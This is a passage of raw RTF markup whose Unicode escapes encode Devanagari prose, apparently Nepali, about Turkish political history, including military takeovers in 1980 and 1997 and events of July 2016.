\f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2325\'3f\u2346\'3f\u2381\'3f\u2340\'3f\u2366\'3f\u2344\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 
\af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2337\'3f\u2335\'3f\u2376\'3f\u2335\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506 " }{\rtlch\fcs1 \af39 
\ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2325\'3f\u2379\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 
\f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2352\'3f\u2370\'3f\u2346\'3f\u2350\'3f\u2366\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 
\ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2330\'3f\u2367\'3f\u2344\'3f\u2367\'3f\u2344\'3f\u2381\'3f\u2341\'3f\u2381\'3f\u2351\'3f\u2379\'3f\u2404\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 
\insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2309\'3f\u2346\'3f\u2381\'3f\u2352\'3f\u2367\'3f\u2354\'3f}{\rtlch\fcs1 
\af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  1 9 80 }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2350\'3f\u2366\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 
\insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506 , }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2335\'3f\u2352\'3f\u2381\'3f\u2325\'3f\u2368\'3f\u2325\'3f\u2366\'3f}{
\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2330\'3f\u2369\'3f\u2344\'3f\u2366\'3f\u2357
\'3f\u2361\'3f\u2352\'3f\u2370\'3f\u2350\'3f\u2366\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506 , }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 
\loch\af39\dbch\af31505\hich\f39 \uc1\u2348\'3f\u2366\'3f\u2351\'3f\u2366\'3f\u2305\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 
\f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2352\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 
\loch\af39\dbch\af31505\hich\f39 \uc1\u2342\'3f\u2366\'3f\loch\af39\dbch\af31505\hich\f39 \u2351\'3f\u2366\'3f\u2305\'3f\u2325\'3f\u2366\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{
\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2360\'3f\u2375\'3f\u2344\'3f\u2366\'3f\u2361\'3f\u2352\'3f\u2370\'3f\u2325\'3f\u2379\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 
\insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2360\'3f\u2350\'3f\u2368\'3f\u2325\'3f\u2352\'3f\u2339\'3f\u2325\'3f\u2379
\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2325\'3f\u2366\'3f\u2352\'3f\u2339\'3f
\u2354\'3f\u2375\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2327\'3f\u2352\'3f\u2381
\'3f\u2342\'3f\u2366\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2330\'3f\u2369\'3f
\u2344\'3f\u2366\'3f\u2357\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2354\'3f\u2366
\'3f\u2350\'3f\u2379\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2360\'3f\u2350\'3f
\u2351\'3f\u2360\'3f\u2350\'3f\u2381\'3f\u2350\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 
\uc1\u2346\'3f\u2369\'3f\u2327\'3f\u2381\'3f\u2351\'3f\u2379\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 
\loch\af39\dbch\af31505\hich\f39 \uc1\u2352\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 
\uc1\u2310\'3f\u2352\'3f\u2381\'3f\u2341\'3f\u2367\'3f\u2325\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 
\loch\af39\dbch\af31505\hich\f39 \uc1\u2346\'3f\u2352\'3f\u2367\'3f\u2360\'3f\u2381\'3f\u2341\'3f\u2367\'3f\u2340\'3f\u2367\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 
\ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2348\'3f\u2367\'3f\u2327\'3f\u2381\'3f\u2352\'3f\u2367\'3f\u2351\'3f\u2379\'3f\u2404\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 
\hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2340\'3f\u2381\'3f\u2351\'3f\u2360\'3f\u2376\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 
\insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2357\'3f\u2352\'3f\u2381\'3f\u2359\'3f\u2325\'3f\u2379\'3f}{\rtlch\fcs1 
\af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2360\'3f\u2375\'3f\u2346\'3f\u2381\'3f\u2335\'3f\u2375\'3f
\u2350\'3f\u2381\'3f\u2348\'3f\u2352\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  12 }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 
\uc1\u2350\'3f\u2366\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506 , }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2335\'3f\u2352\'3f
\u2381\'3f\u2325\'3f\u2368\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2360\'3f\u2358
\'3f\u2360\'3f\u2381\'3f\u2340\'3f\u2381\'3f\u2352\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 
\loch\af39\dbch\af31505\hich\f39 \uc1\u2360\'3f\u2375\'3f\u2344\'3f\u2366\'3f\u2325\'3f\u2366\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 
\f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2346\'3f\u2381\'3f\u2352\'3f\u2350\'3f\u2369\'3f\u2326\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 
\af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2325\'3f\u2344\'3f\u2381\'3f\u2360\'3f\u2344\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{
\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2312\'3f\u2352\'3f\u2375\'3f\u2344\'3f\u2354\'3f\u2375\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 
\hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2360\'3f\u2376\'3f\u2344\'3f\u2381\'3f\u2351\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 
\insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2325\'3f\u2352\'3f\u2381\'3f\u2340\'3f\u2357\'3f\u2381\'3f\u2351\'3f\u2325
\'3f\u2379\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2313\'3f\u2342\'3f\u2381\'3f
\u2328\'3f\u2366\'3f\u2335\'3f\u2344\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2327
\'3f\u2352\'3f\u2375\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506 , }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2360\'3f\u2306\'3f
\u2360\'3f\u2342\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2352\'3f}{\rtlch\fcs1 
\af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2350\'3f\u2306\'3f\u2340\'3f\u2381\'3f\u2352\'3f\u2367\'3f
\u2350\'3f\u2306\'3f\u2337\'3f\u2354\'3f\u2325\'3f\u2379\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 
\loch\af39\dbch\af31505\hich\f39 \uc1\u2357\'3f\u2367\'3f\u2328\'3f\u2335\'3f\u2344\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506 , }{\rtlch\fcs1 \af39 \ltrch\fcs0 
\f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2319\'3f\u2325\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 
\f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2352\'3f\u2366\'3f\u2359\'3f\u2381\'3f\u2335\'3f\u2381\'3f\u2352\'3f\u2367\'3f\u2351\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 
\hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2360\'3f\u2369\'3f\u2352\'3f\u2325\'3f\u2381\'3f\u2359\'3f\u2366\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 
\insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2346\'3f\u2352\'3f\u2367\'3f\u2359\'3f\u2342\'3f\u2325\'3f\u2379\'3f}{
\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2327\'3f\u2336\'3f\u2344\'3f}{\rtlch\fcs1 \af0 
\ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506 , }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2352\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 
\insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2352\'3f\u2366\'3f\u2332\'3f\u2381\'3f\u2351\'3f\u2325\'3f\u2379\'3f}{
\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2346\'3f\u2366\'3f\u2357\'3f\u2352\'3f\u2350
\'3f\u2366\'3f\u2341\'3f\u2367\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2354\'3f
\u2367\'3f\u2344\'3f\u2375\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2344\'3f\u2367
\'3f\u2352\'3f\u2381\'3f\u2339\'3f\u2351\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 
\uc1\u2327\'3f\u2352\'3f\u2375\'3f\u2404\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 
\uc1\u2360\'3f\u2366\'3f\u2350\'3f\u2366\'3f\u2344\'3f\u2381\'3f\u2351\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  Efren }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 
\loch\af39\dbch\af31505\hich\f39 \uc1\u2352\'3f\u2366\'3f\u2332\'3f\u2381\'3f\u2351\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 
\f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2325\'3f\u2379\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 
\f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2346\'3f\u2381\'3f\u2352\'3f\u2350\'3f\u2369\'3f\u2326\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 
\af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2325\'3f\u2379\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 
\f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2352\'3f\u2370\'3f\u2346\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 
\f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2350\'3f\u2366\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 
\f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2360\'3f\u2375\'3f\u2357\'3f\u2366\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 
\f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2327\'3f\u2352\'3f\u2375\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 
\f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2352\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 
\loch\af39\dbch\af31505\hich\f39 \uc1\u2319\'3f\u2325\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 
\loch\af39\dbch\af31505\hich\f39 \uc1\u2360\'3f\u2376\'3f\u2344\'3f\u2381\'3f\u2351\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 
\f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2360\'3f\u2352\'3f\u2325\'3f\u2366\'3f\u2352\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 
\ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2360\'3f\u2381\'3f\u2341\'3f\u2366\'3f\u2346\'3f\u2367\'3f\u2340\'3f\u2404\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 
\hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2346\'3f\u2331\'3f\u2367\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 
\hich\af31506\dbch\af31505\loch\f31506  18 }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2332\'3f\u2370\'3f\u2344\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 
\hich\af31506\dbch\af31505\loch\f31506  1 99 7 }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2325\'3f\u2379\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 
\hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2360\'3f\u2375\'3f\u2344\'3f\u2366\'3f\u2325\'3f\u2379\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 
\insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2342\'3f\u2348\'3f\u2366\'3f\u2348\'3f\u2325\'3f\u2379\'3f}{\rtlch\fcs1 
\af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2348\'3f\u2375\'3f\u2354\'3f\u2366\'3f}{\rtlch\fcs1 \af0 
\ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506 , }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2343\'3f\u2366\'3f\u2352\'3f\u2381\'3f\u2350\'3f\u2367\'3f
\u2325\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2346\'3f\u2381\'3f\u2352\'3f\u2343
\'3f\u2366\'3f\u2344\'3f\u2350\'3f\u2344\'3f\u2381\'3f\u2340\'3f\u2381\'3f\u2352\'3f\u2368\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 
\f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2309\'3f\u2352\'3f\u2348\'3f\u2325\'3f\u2344\'3f\u2354\'3f\u2375\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{
\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2311\'3f\u2360\'3f\u2381\'3f\u2340\'3f\u2368\'3f\u2347\'3f\u2366\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 
\hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2342\'3f\u2367\'3f\u2319\'3f\u2404\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 
\hich\af31506\dbch\af31505\loch\f31506  16 }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2332\'3f\u2369\'3f\u2354\'3f\u2366\'3f\u2312\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 
\insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506 , 2016 }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2350\'3f\u2366\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 
\insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2335\'3f\u2352\'3f\u2381\'3f\u2325\'3f\u2368\'3f\u2354\'3f\u2375\'3f}{
